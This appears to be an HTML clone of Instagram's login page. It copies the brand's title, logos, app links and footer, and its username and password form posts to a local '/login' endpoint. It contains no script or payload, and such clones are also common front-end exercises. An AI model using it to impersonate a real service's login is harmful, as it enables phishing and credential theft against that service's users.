<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="Images/Icon.jpg">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <main class="main-container">
        <!-- Left Side: Phone Image (Hidden on small screens) -->
        <div class="phone-display">
            <img src="Images/Phone.jpg" alt="Instagram App Interface">
        </div>

        <!-- Right Side: Login & Sign Up Forms -->
        <div class="right-column">
            
            <!-- Login Box -->
            <div class="panel login-panel">
                <div class="logo-container">
                    <img src="Images/Instagram Logo.jpg" alt="Instagram">
                </div>
                
                <form id="login-form" method="POST" action="/login">
                    <div class="inputs-container">
                        <input id="username" name="username" type="text" placeholder="Phone number, username, or email" required aria-label="Phone number, username, or email">
                        <input id="password" name="password" type="password" placeholder="Password" required aria-label="Password">
                    </div>
                    
                    <button id="login-btn" type="submit">Log in</button>
                    
                    <div class="divider">
                        <div class="line"></div>
                        <div class="or-text">OR</div>
                        <div class="line"></div>
                    </div>
                    
                    <div class="facebook-login">
                        <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522ph5vcnpvygbud9zy0kogtg9h1rb3ydpj5qidivk84q51c05cla%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5e4cfa3f-0a74-44bb-a6e7-2d85268f6045%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522ph5vcnpvygbud9zy0kogtg9h1rb3ydpj5qidivk84q51c05cla%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0">
                            <span class="fb-icon"></span> 
                            <img src="Images/Facebook Logo.jpg" alt="" class="fb-logo-img">
                            <span>Log in with Facebook</span>
                        </a>
                    </div>
                    
                    <div class="forgot-password">
                        <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
                    </div>
                </form>
            </div>

            <!-- Sign Up Box -->
            <div class="panel signup-panel">
                <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
            </div>

            <!-- Get the App -->
            <div class="app-download-section">
                <p>Get the app.</p>
                <div class="store-links">
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DE3A849D1-1F69-4673-B95B-9EEDE806FC1A%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge" target="_blank">
                        <img src="Images/Google Play.jpg" alt="Get it on Google Play">
                    </a>
                    <a href="https://apps.microsoft.com/detail/9NBLGGH5L9XT?hl=en-us&gl=US" target="_blank">
                        <img src="Images/Microsoft.jpg" alt="Get it from Microsoft">
                    </a>
                </div>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer>
        <div class="footer-links">
            <a href="https://about.meta.com/" target="_blank">Meta</a>
            <a href="https://about.instagram.com/" target="_blank">About</a>
            <a href="https://about.instagram.com/blog" target="_blank">Blog</a>
            <a href="https://about.instagram.com/about-us/careers">Jobs</a>
            <a href="https://help.instagram.com/" target="_blank">Help</a>
            <a href="https://developers.facebook.com/docs/instagram" target="_blank">API</a>
            <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a>
            <a href="https://help.instagram.com/581066165581870/">Terms</a>
            <a href="https://www.instagram.com/explore/locations/">Locations</a>
            <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
            <a href="https://www.threads.net/" target="_blank">Threads</a>
            <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a>
            <a href="https://about.meta.com/technologies/meta-verified/" target="_blank">Meta Verified</a>
        </div>
        <div class="footer-copyright">
            <select aria-label="Switch Display Language" class="language-select">
                <option value="en">English</option>
                <!-- Add other languages if needed -->
            </select>
            <span>&copy; 2024 Instagram from Meta</span>
        </div>
    </footer>
</body>
</html>
